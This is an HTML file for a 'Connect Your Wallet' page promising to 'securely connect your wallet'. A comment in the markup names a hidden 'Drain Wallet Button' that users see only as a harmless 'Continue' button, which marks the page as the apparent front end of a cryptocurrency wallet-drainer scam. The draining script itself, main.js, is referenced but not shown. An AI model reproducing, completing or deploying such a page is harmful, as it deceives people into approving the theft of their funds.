<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connect Wallet</title>
  <link rel="stylesheet" href="/style.css" />
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: #fff;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 20px;
    }

    .card {
      background-color: #1e1e1e;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .card h1 {
      margin: 0 0 20px 0;
      font-size: 24px;
    }

    .card .subtitle {
      margin: 0 0 25px 0;
      font-size: 14px;
      color: #aaa;
    }

    .connect-btn, .continue-btn {
      padding: 12px 20px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      background-color: #4caf50;
      color: #fff;
      transition: background-color 0.3s ease;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 100%;
    }

    .connect-btn:hover,
    .continue-btn:hover {
      background-color: #45a049;
    }

    .spinner {
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 3px solid #fff;
      border-top-color: #4caf50;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-left: 10px;
    }

    .hidden {
      display: none;
    }

    .status {
      margin-top: 20px;
      font-size: 14px;
      color: #ccc;
    }
  </style>
</head>

<body>
  <main class="container">
    <div class="card">
      <h1>Connect Your Wallet</h1>
      <p class="subtitle">
        Securely connect your wallet to continue
      </p>

      <button id="connectBtn" class="connect-btn">
        <span class="btn-text">Connect Wallet</span>
        <span class="spinner hidden"></span>
      </button>

      <div id="status" class="status"></div>

      <!-- Drain Wallet Button (hidden by default) -->
      <button id="drainBtn" class="continue-btn hidden">
        <span class="btn-text">Continue</span>
        <span class="spinner hidden"></span>
      </button>
    </div>
  </main>

  <script type="module" src="/main.js"></script>
</body>
</html>
